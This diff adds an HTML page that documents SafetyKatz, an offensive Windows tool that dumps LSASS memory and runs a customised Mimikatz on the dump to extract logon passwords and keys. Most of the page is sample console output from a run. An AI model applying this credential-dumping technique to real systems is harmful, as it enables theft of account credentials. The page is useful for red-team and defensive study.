@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SafetyKatz</title>
+</head><body>SafetyKatz<br/>
+SafetyKatz is a combination of SharpDump, @gentilkiwi‘s Mimikatz project, and @subtee‘s .NET PE loader.<br/>
+<br/>
+First, the MiniDumpWriteDump Win32 API call is used to create a mini-dump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee’s PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete. This allows you to extract passwords from a system without having to transport the multi-megabyte minidump file, but prevents the Mimikatz’ specific OpenProcess attach to LSASS.<br/>
+<br/>
+<br/>
+C:\Temp&gt;SafetyKatz.exe<br/>
+<br/>
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin<br/>
+[+] Dump successful!<br/>
+<br/>
+[*] Executing loaded Mimikatz PE<br/>
+<br/>
+.#####. &nbsp; mimikatz 2.1.1 (x64) built on Jul &nbsp;7 2018 03:36:26 - lil!<br/>
+.## ^ ##. &nbsp;"A La Vie, A L'Amour" - (oe.eo)<br/>
+## / \ ## &nbsp;/ *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
+## \ / ## &nbsp; &nbsp; &nbsp; &gt; http://blog.gentilkiwi.com/mimikatz<br/>
+'## v ##' &nbsp; &nbsp; &nbsp; Vincent LE TOUX &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ( vincent.letoux@gmail.com )<br/>
+'#####' &nbsp; &nbsp; &nbsp; &nbsp;&gt; http://pingcastle.com / http://mysmartlogon.com &nbsp; *** /<br/>
+<br/>
+mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...<br/>
+<br/>
+Authentication Id : 0 ; 28935082 (00000000:01b983aa)<br/>
+Session &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; : Interactive from 0<br/>
+User Name &nbsp; &nbsp; &nbsp; &nbsp; : blahuser<br/>
+Domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: WINDOWS10<br/>
+Logon Server &nbsp; &nbsp; &nbsp;: WINDOWS10<br/>
+Logon Time &nbsp; &nbsp; &nbsp; &nbsp;: 7/15/2018 1:07:55 PM<br/>
+SID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; : S-1-5-21-1473254003-2681465353-4059813368-1002<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; msv :<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [00000003]<br/>
+Primary<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; * Username : blahuser<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; * Domain &nbsp; : WINDOWS10<br/>
+<br/>
+...(snip)...<br/>
+<br/>
+mimikatz # deleting C:\Windows\Temp\debug.bin<br/>
+</body></html>
